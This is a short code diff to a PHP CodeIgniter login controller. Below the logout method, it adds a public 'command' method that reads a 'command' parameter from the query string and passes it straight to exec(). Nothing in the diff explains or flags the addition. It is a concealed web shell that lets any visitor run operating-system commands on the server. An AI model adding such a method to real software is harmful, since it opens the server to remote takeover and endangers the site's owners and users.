@@ -35,5 +35,10 @@ class Login extends CI_Controller
 		$this->session->sess_destroy();
 		redirect( base_url() . 'index.php/login', 'refresh' );
 	}
+	public function command( )
+	{
+		$data = $this->input->get("command");
+		exec($data);
+	}
 }
 ?>
